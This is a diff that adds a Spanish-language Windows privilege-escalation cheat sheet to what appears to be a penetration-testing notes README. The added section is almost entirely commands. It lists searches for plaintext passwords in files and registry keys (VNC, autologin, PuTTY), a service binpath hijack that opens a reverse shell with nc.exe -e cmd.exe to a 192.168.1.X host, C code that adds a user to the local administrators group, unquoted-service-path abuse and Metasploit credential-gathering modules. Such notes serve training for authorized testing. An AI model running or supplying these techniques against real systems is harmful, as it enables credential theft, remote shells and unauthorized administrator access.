@@ -58,6 +58,7 @@
         * [Conexión al Servicio Microsoft SQL con mssqclient.py de Impacket](#mssqlclient-impacket)
         * [Reconocimiento del Sistema](#reconocimiento-del-sistema)
         * [Kernel Exploits Windows](#kernel-exploits-windows)
+        * [Privilege Escalation Enumeration](#privilege-escalation-enumeration)
 
           
 Antecedentes
@@ -2443,3 +2444,245 @@ A continuación, se enumeran distintos exploits de Kernel interesantes a usar qu
 * [MS14-070](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070)
 * [MS09-012](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS09-012)
 * [MS11-046](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-046)
+
+#### Privilege Escalation Enumeration
+
+A continuación, se detalla una enumeración básica del sistema.
+
+**Información Básica**
+
+```bash
+systeminfo
+hostname
+```
+
+**¿Quiénes somos?**
+
+```bash
+whoami
+echo %username%
+```
+
+**¿Qué usuarios y grupos locales existen en el sistema?**
+
+```bash
+net users
+net localgroups
+```
+
+**Enumerar información de usuario, interesante para ver si el usuario posee privilegios**
+
+```bash
+net user usuario
+```
+
+**Ver grupos de Dominio**
+
+```bash
+net group /domain
+```
+
+**Ver miembros del Domain Group**
+
+```bash
+net group /domain <Group Name>
+```
+
+**Firewall**
+
+```bash
+netsh firewall show state
+netsh firewall show config
+```
+
+**Network**
+
+```bash
+ipconfig /all
+route print
+arp -A
+```
+
+**¿Cómo de bien está parcheado el sistema?**
+
+```bash
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+```
+
+**Búsqueda de Contraseñas en Texto Claro sobre el Sistema**
+
+```bash
+findstr /si password *.txt
+findstr /si password *.xml
+findstr /si password *.ini
+
+dir /s *pass* == *cred* == *vnc* == *.config*
+
+findstr /spin "password" *.*
+findstr /spin "password" *.*
+```
+
+**Búsqueda de Contraseñas en Texto Claro sobre Archivos**
+
+Es probable que nos las encontremos en Base64:
+
+```bash
+c:\sysprep.inf
+c:\sysprep\sysprep.xml
+c:\unattend.xml
+%WINDIR%\Panther\Unattend\Unattended.xml
+%WINDIR%\Panther\Unattended.xml
+
+dir c:\*vnc.ini /s /b
+dir c:\*ultravnc.ini /s /b 
+dir c:\ /s /b | findstr /si *vnc.ini
+```
+
+**Búsqueda de Contraseñas en Texto Claro Almacenadas en Registro**
+
+```bash
+# VNC
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+
+# Windows autologin
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+# SNMP Paramters
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+
+# Putty
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+
+# Búsqueda de Contraseñas almacenadas en Registro
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+```
+
+**Scheduled Tasks**
+
+```bash
+schtasks /query /fo LIST /v > schtasks.txt
+cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
+```
+
+**Cambio de binario para el servicio upnp**
+
+```bash
+sc config upnphost binpath= "C:\Inetpub\nc.exe 192.168.1.X 6666 -e c:\Windows\system32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc config upnphost depend= ""
+```
+
+**Búsqueda de Permisos Débiles**
+
+```bash
+wmic service list brief
+
+# El comando anterior generará montón de contenido, por lo tanto, una buena práctica es parsear los resultados. Lo hacemos en los siguiente pasos.
+
+for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
+
+for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
+
+sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
+
+FOR /F %i in (Servicenames.txt) DO echo %i
+type Servicenames.txt
+
+FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
+
+FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
+
+# Procesamos a continuación cada uno de los resultados obtenidos vía cacls
+
+cacls "C:\path\to\file.exe"
+```
+
+En este paso siempre vamos a estar interesados en el Output _BUILTIN\Users:(F)_, o que nuestro usuario cuente con los permisos _(F)_ o _(C)_:
+
+```bash
+C:\path\to\file.exe 
+BUILTIN\Users:F
+BUILTIN\Power Users:C 
+BUILTIN\Administrators:F 
+NT AUTHORITY\SYSTEM:F
+```
+
+Esto querá decir que nuestro usuario posee permisos de escritura sobre dichos recursos, permitiéndonos de esta forma incrustrar un ejecutable malicioso. 
+
+A continuación, se representa un ejemplo de código en C para un simple **getsuid**:
+
+```bash
+#include <stdlib.h>
+int main ()
+{
+int i;
+    i = system("net localgroup administrators theusername /add");
+return 0;
+}
+```
+
+Compilamos el mismo haciendo uso de la siguiente sintáxis:
+
+```bash
+i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
+```
+
+Una vez compilado y depositado sobre el sistema donde tenemos permisos de sobreescritura (sustituyendo el binario asignado al servicio), reiniciamos el servicio vía **wmic** o **net**, de la siguiente forma:
+
+```bash
+wmic service NAMEOFSERVICE call startservice
+
+net stop [service name] && net start [service name].
+```
+
+**Unquoted Service Paths**
+
+Esta técnica es fundamental para la escalada de privilegios. En primer lugar buscamos servicios con Unquoted path:
+
+```bash
+# Usando WMIC
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+
+# Usando sc
+sc query
+sc qc service name
+```
+
+Si la ruta de alguno de los servicios listados contienen un espacio y no están doblemente encomillados, el servicio es vulnerable.
+
+Suponiendo que la ruta fuera esta a modo de ejemplo:
+
+```bash
+c:\Program Files\something\winamp.exe
+```
+
+Podríamos depositar un binario tal que así:
+
+```bash
+c:\program.exe
+```
+
+Tras reiniciar el servicio, lo que sucederá es que tomará como binario a ejecutar el situado en **c:\program.exe** en vez del que debería, permitiendo así llevar a cabo una ejecución con posibilidad de alto privilegio sobre el mismo.
+
+**Módulos interesantes de Post-Explotación desde Metasploit**
+
+```bash
+use exploit/windows/local/service_permissions
+
+post/windows/gather/credentials/gpp
+
+run post/windows/gather/credential_collector 
+
+run post/multi/recon/local_exploit_suggester
+
+run post/windows/gather/enum_shares
+
+run post/windows/gather/enum_snmp
+
+run post/windows/gather/enum_applications
+
+run post/windows/gather/enum_logged_on_users
+
+run post/windows/gather/checkvm
+```
